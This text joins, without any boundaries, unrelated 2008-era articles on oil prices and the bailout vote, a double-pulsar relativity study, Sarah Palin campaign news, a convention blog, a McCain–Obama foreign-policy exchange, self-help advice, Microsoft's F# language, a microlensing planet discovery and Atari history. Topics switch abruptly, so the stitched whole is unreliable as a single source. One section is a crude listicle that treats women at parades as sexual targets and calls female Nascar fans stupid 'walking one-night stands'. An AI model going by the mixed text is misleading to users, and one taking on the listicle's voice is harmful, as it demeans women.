Oil prices slumped below $ 100 a barrel on Monday as the House of Representatives voted down a $ 700 billion bailout plan for the financial markets , raising the prospect of slower economic growth and depressed demand for petroleum products .
The House leadership , however , plans a second attempt to pass the bill later this week .
Crude oil futures fell $ 10.52 to settle at $ 96.37 a barrel on the New York Mercantile Exchange .
After an erratic and confused week , oil prices have lost nearly $ 25 since Sept. 22 .
Commodity markets have been shaken by the turmoil on Wall Street while still recovering from two powerful hurricanes in the Gulf of Mexico .
After reaching $ 145.29 a barrel in July , prices slumped to nearly $ 90 a barrel this month as the nation ’s economic prospects dimmed .
But in a wild market , they spiked back up last week because of deep uncertainty in the financial markets .
But anxiety once again gripped investors on Monday after a stunning failure of the House to pass the compromise bailout agreement drafted over the weekend .
The plan , the biggest bailout in history , would have allowed the Treasury Department to buy back troubled assets held by banks and other financial institutions .
It was unclear when the House would schedule a new vote on the bailout , or whether it would pass .
The double pulsar PSR J0737- 3039A / B consists in a binary system made two pulsars in a 2.4 - hour orbit .
Each pulsar emits radio waves along its magnetic poles that illuminate Earth - based radio - telescopes like rotating lighthouse beacons as they spin ; one every 23 milliseconds and the other every 2.8 seconds .
The fortunate almost - perfect alignment of our line of sight with the orbital plane of the system gives rise to an eclipse of the 23 - ms pulsar , once per orbit , as it moves behind its 2.8 -s pulsar companion .
The eclipse is created by the magnetosphere of the 2.8-s pulsar , a region in which a dense cloud of plasma is trapped by the magnetic field of the pulsar .
These eclipses allow us to infer the orientation the 2.8-s pulsar since changes in the geometry would affect the way that light emitted by the other pulsar is transmitted to us during the eclipse .
According to classical Newtonian physics , the spin axis about which a star rotates should remain fixed with respect to the background stars as it orbits another star .
Einstein 's general relativity predicts , however , that the spin axis should slowly precess , like the gentle wobble of a tilted spinning top .

Researchers at McGill University 's Department of Physics – along with colleagues from several countries – have confirmed a long - held prediction of Albert Einstein 's theory of general relativity , via observations of a binary - pulsar star system .
Their results will be published July 3 in the journal Science .
Pulsars are small , ultradense stellar objects left behind after massive stars die and explode as supernovae .
They typically have a mass greater than that of our Sun , but compressed to the size of a city like Montreal .
They spin at staggering speeds , generate huge gravity fields and emit powerful beams of radio waves along their magnetic poles .
These illuminate Earth - based radio - telescopes like rotating lighthouse beacons as the pulsar spins .
More than 1,700 pulsars have been discovered in our galaxy , but PSR J0737-3039A / B , discovered in 2003 , is the only known double - pulsar system ; that is , two pulsars locked into close orbit around one another .
The two pulsars are so close to each other , in fact , that the entire binary could fit within our Sun. PSR J0737-3039A / B lies about 1,700 light years from Earth .
This new test of Einstein 's theory was led by McGill astrophysics PhD candidate René Breton and Dr. Victoria Kaspi , leader of the McGill University Pulsar Group .
" A binary pulsar creates ideal conditions for testing general relativity 's predictions because the larger and the closer the masses are to one another , the more important relativistic effects are , " Breton explained .
" Binary pulsars are the best place to test general relativity in a strong gravitational field , " agreed Kaspi , McGill 's Lorne Trottier Chair in Astrophysics and Cosmology and Canada Research Chair in Observational Astrophysics .
" " Einstein 's theory predicted that , in such a field , an object 's spin axis should slowly change direction as the pulsar orbits around its companion .
Imagine a spinning top when its slightly non-vertical : the spin axis slowly changes direction , an elegant motion called ' precession . ' "
The researchers discovered that one of the two pulsars is indeed precessing -- just as Einstein 's 1915 theory predicts .
If Einstein had been wrong , the pulsar would n't be precessing , or would precess in some other way .
Pulsars are too small and too distant to to allow us to directly observe their orientation , the researchers explained .
However , they soon realized they could make such measurements using the eclipses visible when one of the twin pulsars passes in front of its companion .
When this occurs , the magnetosphere of the first pulsar partly absorbs the radio " light " being emitted from the other , which allows the researchers to determine its spatial orientation .
After four years of observations , they determined that its spin axis precesses just as Einstein predicted .
Even though spin precession has been observed in Earth 's solar system , differences between general relativity and alternative theories of gravity might only shake out in extremely powerful gravity fields such as those near pulsars , Breton said .
" However , so far , Einstein 's theory has passed all the tests that have been conducted , including ours .
We can say that if anyone wants to propose an alternative theory of gravity in the future , it must agree with the results that we have obtained here . "
Breton , Kaspi and colleagues in Canada , the United Kingdom , the U.S. , France and Italy studied the twin - pulsar using the 100 - metre Robert C. Byrd Green Bank Radio Telescope at the National Radio Astronomy Observatory in Green Bank , WV .
" I think that if Einstein were alive today , he would have been absolutely delighted with these results , " said Dr. Michael Kramer , Associate Director of the Jodrell Bank Centre for Astrophysics at Manchester University .
" Not only because it confirms his theory , but also because of the novel way the confirmation came about . "

The truncated dipolar magnetosphere of pulsar B , shown as a colored dipolar structure , rotates about its spin axis , pictured as a diagonal rod .
The apparent orbital motion of pulsar A during the eclipse corresponds to the horizontal black line intersecting pulsar B's magnetosphere .
Relativistic spin precession is similar to the wobbling of a spinning top and induces a motion of the spin - axis orientation around the orbital angular momentum , which is vertical in this movie .
The theoretical light curve corresponding to the eclipse animated in the upper panel is drawn in the lower panel .
The angle phi corresponds to the longitude of the spin axis , with 0 degree being the direction coincident with the line of sight .

Pulsar Sound :
This audio file is the sound that one would hear if the radio signal detected from PSR J0737-3039A by the radio telescope was noise - filtered and amplified into an audio device .
While individual pulsations from the pulsar are too fast to be distinguished , we can hear a mixture of F musical tones harmonically related to 44 Hz ( F1 tone ) , the spin frequency of the pulsar .
The sound is modulated in intensity as a result of the eclipse when the pulsar passes behind its companion pulsar .

Republicans launch ' Palin Truth Squad ' to defend McCain VP pick 's record RAW STORY
Published : Tuesday September 9 , 2008
Print This Email This " Democrats understand Sarah Palin is a formidable political force who has upset the Obama victory plan , " opined the Wall Street Journal on Tuesday .
" It 's no surprise , then , that Democrats have airdropped a mini-army of 30 lawyers , investigators and opposition researchers into Anchorage , the state capital Juneau and Mrs. Palin 's hometown of Wasilla to dig into her record and background . "
In response to said " airdropping , " a coalition of state and local politicians dubbed the Palin Truth Squad has been created by the McCain campaign to , in their words , " set the record straight . "
" We 're proud of Governor Palin 's leadership in Alaska and record of taking on entrenched special interests and the good old boys network , " said former Massachusetts Governor Jane Swift .
" Governor Palin 's commitment to reform is well - known but there are those who would seek to distort that record with vile rumors and smears against her , her husband , her children and her friends .
We will not allow those on the left and in the media to smear a woman who has always served her constituents with honor .

Days ago , Mother Jones reported that Governor Sarah Palin ’s office withheld about 1100 emails in response to an open records act request filed in June and claimed that these emails to and from Palin aides and the governor herself covered confidential and official policy deliberations between Palin and her staffers .
But the list ( PDF ) of the undisclosed emails indicates that many had subject lines suggesting they were not about policy matters .
( A series of emails referred to one of Palin ’s political foes , another set to a well - known Alaskan journalist . )
And many of the emails were CC’ed to Todd Palin , the governor ’s husband , who holds no official position in her administration .
On Tuesday , Andrée McLeod , the independent watchdog who filed the original request , submitted an appeal ( PDF ) , asking Palin , the Republican vice presidential nominee , to review the decision to keep these emails secret .
Here is the statement McLeod issued afterward :
September 9 , 2008 , Anchorage , Alaska — Andrée McLeod , a registered Republican and well - known citizen watchdog filed an administrative appeal in which Ms. McLeod requested Alaska Governor Sarah Palin to review the decision to withhold or redact over 1,100 public records in violation of the Alaska Public Records Act .
The records document the day - to - day operation of the Governor ’s Office and members of her administration during Sarah Palin ’s tenure as governor .
“ The people of Alaska have a right to know the inner workings of their government .
They have a right to know how the individuals they elect to public office are discharging the public trust , ” McLeod said .
“ The decision to hide documents to which state law allows citizens to have access suggests that Governor Palin ’s promise to have a transparent administration is bogus . ”
“ Equally troubling , ” said Donald Mitchell , the Anchorage attorney who is representing Ms. McLeod , “ is the fact that the records that have been provided to Ms. McLeod document that for the past two years Governor Palin has allowed her husband , Todd Palin , to compromise governmental decision - making by inserting himself whenever he chooses to do so into the day - to - day operations of the Office of the Governor . ”
Documents received in response to a public records request by McLeod contained logs of undisclosed emails and thousands of e-mails assigned to Palin administration appointees Frank Bailey and Ivy Frye .
The logs and redacted e-mails are the basis of this administrative appeal .
“ Keeping government communications secret is not being a ‘ champion of transparent government ’ and fails to meet Governor Palin ’s promises that she established and ran on , ” McLeod says .
“ What is Sarah Palin hiding ? ”
Will Palin get to this review before Election Day — if at all ?
Halloween parades
Goth chicks have never really had too many problems with hasty , unsanitary , potentially regrettable sex .
Halloween parades are , generally , the one place where said goth chicks and " normal " people ( like you , assumedly ) can congregate and celebrate while dressed up as the Joker or something .
The costumes help make potential hookups more anonymous and mysterious , and will probably make decent - to - attractive goth chicks even hotter .
Your one goal at a Halloween party is to , while dressed as the Joker , find and bang someone dressed like Harley Quinn .
Oktoberfest
I dunno if you heard , but Oktoberfest involves a lot of alcohol and Aryan chicks in lederhosen .
Even if you do n't get laid -- and if you can't get laid in a place where 90 % of the population is drunk , then you probably had it coming -- you 'll at least be sloshed out of your mind .
And hey , after your fourth boot of lager , even the ugliest Fraulein will look like Scarlett Johansson !
Mardi Gras
Mardi Gras was always a big celebration of confetti and nipples , but the whole festival has been imbued with a sort of remorseful intensity since Hurricane Katrina .
We all looked at New Orleans as the number one Mardi Gras spot on the planet , and after God decided to wipe her off the face of the map , other Mardi Gras celebrations across the globe have felt it necessary to up the ante of their own Mardi Gras celebrations .
If New Orleans can't celebrate in the way they so rightfully should be able to , then other cities feel it is their responsibility to party twice as hard to make up for the Katrina tragedy .
This means more booze , more dancing , and more really , really bad decisions .
Macy 's Thanksgiving Day Parade
Now , now .
I know what you 're thinking : the Macy 's Thanksgiving Day Parade is a family - friendly day of floats and fun !
How could you possibly pick up chicks there ?!
Well , it 's difficult , but therein lies the fun : how might you convince someone to have sex with you while a three - story tall Hello Kitty balloon hovers over you , watching your every move with a mixture of confusion and disdain ?
Statistically , there have to be many single people at a parade that damn big , in a city as huge as New York .
Mixed amongst all the families and Today Show hosts , you can definitely find and attract someone .
Think of it as a challenge .
Renaissance Faire
The Renaissance Faire is sort of like Halloween , but way nerdier , and therefore way easier to find sex .
The women may be marginally less attractive , but they 're clothed in interesting period garb , generally have big bosoms ( as mildly chubby women do ) , and will likely be ready to engage in the sort of hedonistic wenchmenship the Middle Ages were known for .
No renaissance recreation can be complete without dirty , medieval hookups : if you can have huge turkey drumsticks , jousting , kings and booze but not unsanitary sex , then what the hell 's the point ?
Brazilian Carnival
We already went into great detail about why Brazilian women are the hottest in the world , and Carnival is one of the biggest parades / parties / festivals in the entire world .
The reasons this parade should be worth your time oughtta be pretty obvious .
The Noosa Festival Bikini Surfing Parade
In Australia , the Noosa Festival of Surfing Bikini Parade , in addition to being one of the most grammatically nonsensical titles in history , is as awesome as you 'd expect .
There 's a surfing competition for the men and women , and then a bikini contest / parade thing where the chicks ( many of them surfers themselves ) compete to see who 's the hottest hottie in hottieville .
If you go , make sure to at least try to surf ; if you try to pick up chicks without hitting the water , they 'll see right through your schtick to the would - be pickup artist you 're trying to be .
You 'll have to learn to surf and bring a board if you want to get any , but the rewards will be great .
Disneyland Electric Light Parade
Like the Macy 's Day parade , this traditionally family - friendly situation is really just another huge challenge for getting play .
It 's even more challenging , of course , as the Main Street Light Parade was technically canceled twelve years ago .
Still , the various Disneyland parks do parades pretty much every time they get a chance , and ( even ignoring the hot college chicks who play Disney princesses ) , there are an awful lot of repressed teenagers and twentysomethings who still hold onto the hope that true happiness can still be found in small pockets of the Earth like Disneyland .
This is hilariously naive , of course , but showing the same amount of naivete can be a great way to get ingratiated with them .
This , of course , leads to coitus in the happiest place on Earth .
Las Vegas Nascar Parade
While probably the most boring parade in fucking history , the Vegas Nascar Parade brings out Nascar fans -- make you own " might be a redneck " joke here -- from the woodwork .
So long as we 're working off horrible stereotypes , the average female Nascar fan is probably really drunk , confused , and not terribly intelligent .
They are , in other words , walking one - night stands .
Nassau Hooters Parade
It 's exactly what it sounds like .
Exactly .
Hustler Lingerie Parade
I realize this is a picture of Gemma Atkinson rather than a photo from the actual Hustler Lingerie Parade , but you try typing " Hustler " and " Lingerie " into Google and finding anything even remotely safe for work .
It 's really not a " parade , " strictly speaking -- more of a fashion show -- but it 's basically got a hell of a lot of Hustler models wearing lingerie ( a step up in credibility from what they 're probably used to , given Larry Flynt 's proclivities ) .
You 'll have to be really good to outdo all the other slobbering manchildren present for the parade and nab the odd female onlooker or , in an even rarer instance , one of the models themselves .
Given the rarity of the parade and the illustriousness of the hotties involved , only the ballsiest ( or most arrogant ) of men need apply .
Berlin Love Parade
The Berlin Love Parade is meant to celebrate the fall of the Berlin wall symbolizing personal and political freedom .
The " Love " is supposed to refer to free love , peace , brotherhood and mutual respect .
This , of course , usually devolves into booze and experimental fucking .
People will always want to drink and have irresponsible sex , and the " love " in " Love Parade " gives them an excuse .
They can pretend that their lust for booze and flesh are in some way symbolic of a great , peaceful struggle against oppression and fascism .
It 's total bullshit , of course , but it makes for a nice pickup situation .
Republican National Convention , Day 3 , Part Two
Stateside With Rosalea Barker
Republican National Convention , Day 3 , Part Two
The 8 - 9 pm hour was supposed to conclude with live music by Gretchen Wilson , John Rich and Cowboy Troy , and I must say I was disappointed not to see the G - girl when they just moved right along with the next speakers .
One has to wonder why Linda Lingle is n’t the Vice Presidential candidate .
Oh , sorry !
That would be because she has grey hair , has only a couple of children , and is twice divorced .
Lingle has the same executive experience as Palin — mayor of Maui County and Governor of Hawaii — but she does n’t have the youthful looks or the chance to send her son off to war at such an expedient time .
When Lingle spoke of McCain choosing “ an experienced woman governor ” she looked downright disappointed that it was n’t her .
During Lingle ’s speech the chants of “ Sarah ! Sarah ! ” began , along with the chants of “ Zero! Zero ! ” in reference to Obama .
( Ca n’t you just see the ZerObama posters already ? )
The funny thing was that the two words are virtually indistinguishable when being chanted by thousands of people in a sports arena .
And even funnier was when the crowd chanted “ Zero! Zero ! ” in all the wrong parts of Rudy Giuliani ’s nasty , sarcastic speech .
The effect was positively Pythonesque .
Talking about the troop surge and politicians changing their positions to be popular , Giuliani asked , “ How many times have we seen Obama do this ? ” “ Zero! Zero ! ” came the response from the crowd , which seemed to be reacting to cue words instead of listening to what was actually being said .
( Above ) Georgia delegates wave their “ Georgia Loves John McCain ” placards at Giuliani ’s mention of McCain saying “ We ’re all Georgians now . ”
Finally , the lady of the night made her appearance .
There ’s something about Sarah Palin ’s looks that remind me of the lead character in The New Adventures of Old Christine , but her attitude is more that of the nasty PTA moms Christine is always having a run-in with .
The scariest part of her speech was her statement that “ there is a time to campaign and a time to put country first ” .
That will be the moral high ground the Republicans will take during the election season .
It is simply the Bush Iraq invasion mantra “ You ’re either with us or against us ” repackaged for a domestic election audience .
There was very little for the Democrats to take comfort from in her speech .
This election will be downright nasty , and it will take all the evenhandedness the Obama campaign can muster to keep from getting into the mudslinging that seems inevitable .
( Above )
At the conclusion of Palin ’s speech and standing ovation , delegates got into a bit of boot - scootin ’ in the aisles .
Finally , we came to the important part of the evening ’s agenda in terms of what conventions are all about — the votes of the delegations for their preferred presidential candidate .
The first shock was Alaska , which has 29 votes .
It cast 24 for McCain and 5 for Ron Paul .
The Secretary recording the vote did not even mention the votes for Ron Paul when she read them back .
She just said “ 24 for John McCain . ”
One of the Alaska delegates , Evan Cutler , told me the next day that there had been a shouting match that evening between him and the delegation leader on the floor , with Cutler insisting the Paul delegates ’ votes be enumerated .
Cutler also said he ’d had calls from other state delegations urging him not to rock the boat but to just go along with there being a unanimous vote for McCain .
Another Ron Paul supporter , Bill Montgomery , told me that when state delegations later in the alphabet tried to give a number of votes for anyone other than McCain , their microphone was cut off .
“ Look at the vote counts , ” he said , “ they do n’t add up . ”
Most states simply accepted being browbeaten into saying they were unanimous for McCain when they were n’t .
Even Arkansas , Mike Huckabee ’s home state , cast all their votes for McCain .
( Above )
At the beginning of the roll call , Arizona passed on giving its numbers , so it could later be the state whose votes put its Senator , John McCain , over the top .

( CNN ) -- Shortly after Barack Obama laid out his foreign policy vision in Washington on Tuesday , presumptive Republican presidential nominee John McCain criticized his proposals as naive and premature .
John McCain blasted Obama for laying out his strategy in Iraq before speaking with those on the ground .
McCain attacked the Illinois senator 's opposition to the surge policy in Iraq and highlighted his own proposal for victory in Afghanistan .
" [ Obama ] is speaking today about his plans for Iraq and Afghanistan before he has even left , before he has talked to Gen .
Petraeus , before he has seen the progress in Iraq and before he has set foot in Afghanistan for the first time , " McCain said at a campaign event in New Mexico .
" In my experience , fact - finding missions usually work best the other way around : First , you assess the facts on the ground ; then you present a new strategy . "
Watch McCain criticize Obama »
The foreign policy speech , originally intended for later in the week , was delivered at an Albuquerque town hall meeting that had been set up to promote McCain 's economic plan .
Obama is to travel to Iraq this month as part of a congressional delegation that will include Republican Sen. Chuck Hagel of Nebraska and Democratic Sen. Jack Reed of Rhode Island , both of whom have been mentioned as possible running mates for the presumptive Democratic nominee .
At his foreign policy speech Tuesday morning , Obama attacked McCain 's position on the state of the conflict .
Read about Obama 's plans for Iraq , Afghanistan
" Sen. McCain said -- just months ago -- that ' Afghanistan is not in trouble because of our diversion to Iraq . '
I could not disagree more , " he said .
" Our troops and our NATO allies are performing heroically in Afghanistan , but I have argued for years that we lack the resources to finish the job because of our commitment to Iraq . "
Watch Obama 's criticism of McCain »
McCain fired back roughly an hour later .
" Sen . Obama will tell you we can't win in Afghanistan without losing in Iraq .
In fact , he has it exactly backwards .
It is precisely the success of the surge in Iraq that shows us the way to succeed in Afghanistan , " he said .
" It is by applying the tried and true principles of counter - insurgency used in the surge -- which Sen. Obama opposed -- that we will win in Afghanistan .
With the right strategy and the right forces , we can succeed in both Iraq and Afghanistan .
" I know how to win wars .
And if I 'm elected president , I will turn around the war in Afghanistan , just as we have turned around the war in Iraq , with a comprehensive strategy for victory . "
Read where the candidates stand on Iraq
McCain's Afghanistan proposal includes the addition of brigades , the launch of an integrated nationwide security plan for the civilian population , greater military engagement of Taliban forces and unity of command , a doubling of the size of the Afghan army , a boost in civilian - military engagement , and the appointment of an " Afghanistan czar " -- a White House - based national security official , reporting to the president , whose task would be to bring the war to an end .
Watch McCain explain his plan for Afghanistan »
In his remarks Tuesday , he also stressed nonmilitary assistance to the Afghan government and economy , and the promotion of alternative crops as a way to end drug trafficking in the region .
McCain added that special attention must be paid to Pakistan , " where terrorists today enjoy sanctuary . "
He called for the strengthening of local tribes that are willing to fight terrorists there , as well as greater nonmilitary assistance to the civilian government .
" Sen . Obama has spoken in public about taking unilateral military action in Pakistan .
In trying to sound tough , he has made it harder for the people whose support we most need to provide it , " McCain said .

Everyone wants to have a fulfilling life .
Unfortunately , many people miss a key ingredient to have it : finding their life purpose .
They may spend years of their life only to find at the end that they have done the wrong things .
Many others achieve fame and financial success but feel empty inside .
Do n’t make the same mistake .
Your time is too precious to waste .
Why You Should Find Your Life Purpose
Here are three reasons why you should find your life purpose :
1 . It gives meaning to everything you do
Your life purpose makes everything you do meaningful .
You could be successful outside , but if you do n’t find meaning you will feel empty inside .
2 . It directs and guides you
Not only can your life purpose give you meaning , but also it can give you clear direction of where to go in life .
It helps you make big decisions in life .
People who do n’t find their life purpose do n’t have a strong foundation upon which to make their decisions .
They most likely will just follow popular opinions .
Besides helping you make big decisions , your life purpose can also guide you in making small decisions .
When you have two options in front of you , it will be easier for you to decide if you know what your life purpose is .
3 . It motivates you
In life there are always difficult times to go through .
You may experience failures or rejections .
In such situations , your life purpose can give you the motivation you need to keep going .
How can your life purpose do that ?
By helping you see beyond the horizon .
What you face in front of you may seem difficult but your life purpose helps you see beyond it .
Finding Life Purpose Is Not Easy
It ’s never easy to find life purpose .
In fact , it ’s one of the most difficult things to do .
Here are two reasons why finding life purpose is difficult :
1 . It does n’t have a universal formula
Life purpose is a personal thing .
Everyone has different purpose and different way to find it .
What apply to me might not apply to you and vice versa .
2 . It takes time
This is perhaps the main reason why many people never find their life purpose .
They want results instantly .
Unfortunately , finding life purpose does n’t work that way .
It ’s more like a journey than a one - time stop .
Tips to Find Your Life Purpose
While finding life purpose is a personal experience , there are a few tips that can help you find it .
Here they are :
1 . Do n’t expect instant result
I ’ve written above that finding life purpose takes time so do n’t expect to find it soon .
It ’s a journey and rather than complaining about your journey you ’d better enjoy it .
2. Identify your strengths
Your life purpose is related to your personal strengths .
If you are strong in learning , for instance , it ’s likely that your life purpose is related to learning .
One way to find personal strengths is through Strengths Finder test which can be found in the book Strengths Finder 2.0 .
3. Identify your passions
I ’ve written about passions multiple times here .
Your passions are things you do because of love and not because of external reward such as money or recognition .
Find and develop your multiple passions .
4. Identify your causes
Identify the causes that matter to you .
Is there a condition in the world that makes you feel discontent ?
Is there a condition that makes you feel the urge to do something about it ?
5 . Find the intersection between your strengths , passions , and causes
Now that you have identified your strengths , passions , and causes , you can find the intersection between them :
Pick a cause from your list of causes .
From your list of strengths , pick those that can help you improve the situation in the cause .
From the strengths you pick , find the ones you can work on with enthusiasm .
You can repeat this exercise until you find a cause which have strong intersection with your strengths and passions .
At the end of the exercise , you will find a cause you deeply care about for which you can effectively do something with enthusiasm .
This is a clear sign of your life purpose .
6 . Write a personal mission statement
Based on what you find in the previous step , write a personal mission statement .
It ’s your one - liner that concisely communicate what your life purpose is .
Do n’t worry about getting it right on the first try .
Just write down what you ’ve got and build upon it .
7 . Do something about the intersection
Your one - liner is your guide to finding your life purpose .
It may still be broad , so you should keep refining it .
The way to refine it is by working on it .
Make serious effort to act upon what you ’ve found .
Increase your competence and find ways to contribute to the cause you choose .
Your effort will give you feedback that will either reinforce or diminish your interest on the subject .
8 . Act based on the feedback to refine your personal mission statement
If the feedback from the previous step reinforces the purpose you ’ve found , over time you will get better understanding of what exactly your life purpose is and how you should fulfill it .
You may create new one - liners as you find new clues .
This process of refining may take years but you are going in the right direction .
You just need to keep your eyes and mind open to recognize every new clue regarding your strengths , passions and causes .
***
I wrote my first personal mission statement in 2004 and it stayed for three years until I wrote my second ( and current ) one in 2007 .
I walk with it and I ’m getting better and better idea about the precise nature of my life purpose .
I enjoy my journey .
I hope you do too .

NEW YORK - Microsoft plans to deliver a new general - purpose programming language to developers , known as F# ( pronounced F Sharp ) , that takes advantage of the functional programming model .
Speaking at the VSLive New York conference here on Sept. 8 , Luke Hoban , the F# program manager at Microsoft , said F# is a functional programming language for .NET , which will join C# and Visual Basic as core .NET languages .
Functional programming is a programming paradigm that treats computation as the evaluation of mathematical functions and avoids state and mutable data .
It emphasizes the application of functions , in contrast with the imperative programming style that emphasizes changes in state .
" Functional programming means functions are very important , " Hoban said .
" With F # we pass around functions like any kind of data . "
Hoban further explained that " F# is a functional , object - oriented , imperative and explorative programming language for .
NET . "
And , " F# makes an inference that a language should be good at doing explorative development , " he said .
However , " by no means is F# a replacement for C# or Visual Basic , which are great for mainstream development , " Hoban said .
" F# is meant to go out and extend the reach of .NET to new developers and new types of developers . "
F# started as a research project in Microsoft 's research lab in Cambridge , England .
" And about eight months ago Microsoft decided there was an audience we could target more aggressively " with the language , Hoban said .
Although Hoban described F# as a general - purpose language , he said it is particularly suited to doing technical algorithms and explorative tests , financial modeling and analysis , data mining , scientific data analysis , domain specific modeling , and academic uses .
In fact , Hoban said many of the early adopters of F# are financial services companies in New York on Wall Street .
Hogan also noted that F# borrows from other languages and is strongly typed , has a succinct syntax , is scalable , has libraries , and is explorative , interoperable and efficient .
Other characteristics early users have listed as benefits of F# are that it is quick coding , supports scripting , has good performance , is symbolic and has .NET integration .
At the end of August , Microsoft released the September CTP ( Community Technology Preview ) of F#. That CTP features improved integration with Visual Studio 2008 and was co-developed by Microsoft Research in Cambridge and Hoban 's group in Redmond , Wash .
The September CTP of F# also features improvements to the F# language and libraries to make them simpler and more regular .
And there is also a new language feature , Units of Measure , which extends F# 's inference and strong typing to floating - point data .
Don Syme , the Microsoft researcher who devised F# , in a blog post , said :
" " F# is a simple , type - safe , efficient , scalable language for the .NET platform that supports both functional and object - oriented programming .
One of the key things about F# is that it spans the spectrum from interactive , explorative scripting to component and large - scale software development .
In this release we 've made major improvements to the language , libraries and tools across this spectrum . " "
Along with the CTP , Microsoft also launched " a new F# Developer Center on MSDN [ Microsoft Developer Network ] , " said S. " Soma " Somasegar , senior vice president of Microsoft 's Developer Division , in a blog post .
" This developer center provides resources for F# developers and links to F# user communities . "
Hoban said Microsoft will deliver in 2009 the first supported release of F# that will be aligned with the next version of Visual Studio .
However , Hoban said it is not yet clear whether F# will be delivered as an add - in or " out of the box . "
Because F# supports immutability , it is good for parallel programming , Hoban said .
" We treat things as being immutable , and immutability comes up when we get to more parallel applications .
...
What immutability means for F# is if you define a value you can't change it - it 's not mutable . "
F# has " the static typing of C# with the succinctness of a scripting language , " Hoban said .
The language also features a type inference capability , where the compiler can tell what type the developer intended to use .
Indeed , Hoban demonstrated the integration of F# with Visual Studio , where he hovered the cursor over a piece of code and a pop- up displayed what type the code was .
" On the language side , some of the consistent feedback we get about F# is that the combination of type - inferred programming and interactive exploration allows you to develop correct algorithms and objects quickly and with a very low error rate , " Syme said .
F# also supports pattern matching , functional collections and scripting via the Script.fsx extension , said Hoban said , who showed a demonstration in which he used DirectX and F# to do visualization of data .
Regarding performance , " in F # you get really good performance , " Hoban said .
" F# can probably run 10 to 20 times faster than Python . ...
You should look for performance at about the same level as C# . "
Moreover , Hoban said as proof of the applicability of F# , " we develop F# in F# , " with only one or two side projects in C# , Visual Basic and C++ contributing to the development of the language .
Astronomers find tiny planet orbiting tiny star
An international team of astronomers led by David Bennett of the University of Notre Dame has discovered an extra -solar planet of about three Earth masses orbiting a star with a mass so low that its core may not be large enough to maintain nuclear reactions .
The result was presented Monday ( June 2 ) at the American Astronomical Society annual meeting in St. Louis .
The planet , referred to as MOA - 2007 - BLG - 192Lb , establishes a record for the lowest mass planet to orbit a normal star .
The star , MOA - 2007 - BLG - 192L , is at a distance of 3,000 light years and the lowest mass host star to have a companion with a planetary mass ratio .
The mass of the host is about 6 percent of the mass of the sun .
Such a star is called a brown dwarf , because this is slightly below the mass needed to sustain nuclear reactions in the core .
But the measurement uncertainty also permits a host mass slightly above 8 percent of a solar mass , which would make MOA - 2007 - BLG - 192L a very low - mass hydrogen burning star .
" Our discovery indicates that even the lowest mass stars can host planets , " Bennett said .
" No planets have previously been found to orbit stars with masses less than about 20 percent of that of the sun , but this finding suggests that we should expect very low - mass stars near the sun to have planets with a mass similar to that of the Earth .
This is of particular interest because it may be possible use NASA 's planned James Webb Space Telescope to search for signs of life on Earth - mass planets orbiting low - mass stars in the vicinity of the sun . "
The discovery of the MOA - 2007 - BLG - 192L star - planet system was made by the Microlensing Observations in Astrophysics ( MOA ) , which includes Bennett , and the Optical Gravitational Lensing Experiment ( OGLE ) collaborations using the gravitational microlensing method .
Gravitational microlensing takes advantage of the fact that light is bent as the rays pass close to a massive object , like a star .
The gravity from the mass of the intervening object , or lens star , warps surrounding space and acts like a giant magnifying glass .
As predicted by Albert Einstein and later confirmed , this phenomena causes an apparent brightening of the light from a background " source " star .
The effect is seen only if the astronomer 's telescope lies in almost perfect alignment with the source star and the lens star .
Astronomers are then able to detect planets orbiting the lens star if the light from the background star also is warped by one or more planets .
The primary challenge of the microlensing method is the precise alignments needed for the planetary microlensing signals are quite rare and brief , often lasting less than a day .
This discovery was made possible by the new MOA - II telescope at New Zealand 's Mt. John Observatory , using the MOA - cam3 camera , which is able to image an area of sky 13 times larger than the area of the full moon in a single image .
" The new MOA telescope - camera system allows us to monitor virtually all of the known microlensing events for planetary signals , " Bennett said .
" We would not have made this discovery without it . "
The microlensing observations provided evidence that the host star has a mass of about 6 percent of the mass of the sun .
This was confirmed by high angular resolution adaptive optics images with the Very Large Telescope ( VLT ) at the European Southern Observatory in Chile .
These images confirm that the planetary host is either a brown dwarf or a very low - mass star .
The planet orbits its host star or brown dwarf with an orbital radius similar to that of Venus .
But the host is likely to be between 3,000 and 1 million times fainter than the sun , so the top of the planet 's atmosphere is likely to be colder than Pluto .
However , the planet is likely to maintain a massive atmosphere that would allow warmer temperatures at lower altitudes .
It is even possible that interior heating by radioactive decays would be sufficient to make the surface as warm as the Earth , but theory suggests that the surface may be completely covered by a very deep ocean .
This result also supports the 1996 prediction by Bennett and Sun Hong Rhie that the microlensing method should be sensitive to Earth - mass planets .
" I 'll hazard a prediction that the first extra-solar Earth - mass planet will be found by microlensing , " Bennett said .
" But we 'll have to be very quick to beat the radial velocity programs and NASA 's Kepler mission , which will be launched in early 2009 . "

[ Following his article on Atari 's genesis , game historian Fulton returns with an amazingly detailed piece on Atari's ' golden years ' , from Asteroids through Battlezone . ]
Atari was founded in 1972 , but its crowning accomplishments in console gaming and computers were the Atari Video Computer System ( or 2600 ) and the Atari 400/800 line of personal computers .
This four - year period -- from 1977 to 1981 -- contains some of the most exciting developments the company ever saw in its history : the rise of the 2600 , the development of some of the company 's most enduringly popular games ( Centipede , Asteroids ) and the development and release of its first home computing platforms .
This comprehensive look back , filled with quotes from the original creators and other primary sources , offers a detailed peek into the company that popularized video gaming as the ' 70s turned into the ' 80s , and created the first viable market for home consoles .
For more detail , be sure to read Gamasutra 's first Atari history article , which covers the period of 1971 to 1977 -- the latter date being the year that the Atari VCS was first released .
Innovate , Kind Of Like You Did Last Year
" One of the guys at Warner said ...
I had made a proposal to make a really interesting set of games .
I can remember him not even blinking and looking at me and saying ' Nolan , why do n't you innovate kind of like you did last year , none of this new stuff ? '
He did not understand what he said , he was so out of tune with what the nature of innovation is , and I 've been thinking I was going to get that put into needle - point sometime . "
i
- Nolan Bushnell
Innovative leisure .
It was a concept that Atari , under guidance of Nolan Bushnell , had cultivated for its entire existence .
The engineer entertainers of Atari either invented or were driven to invent by competition , some of the most mind - blowing gaming creations of the 20th century .
" These people were my friends and co-workers and we were sort of united in this quest for cool stuff . "
ii
- Nolan Bushnell
However , dreaming up ideas is only one part of a successful business -- you also need to find customers to buy them .
The objective pursuit of engineering cool stuff is almost entirely at odds with the subjective nature of marketing it .
" The marketing department had never played a video game ... marketing thought the programmers were lazy , the programmers thought marketing was stupid ... we did n't like them , they did n't like us . " iii
- Rob Fulop ( Atari VCS game developer )
When Atari was focused on coin - operated games , marketing was not as much of a factor .
The small audience that needed to know about its games ( arcade operators and distributors ) could be reached fairly easily through publications like Replay magazine and Coin Connection , mail - outs of advertising flyers , and trade shows .
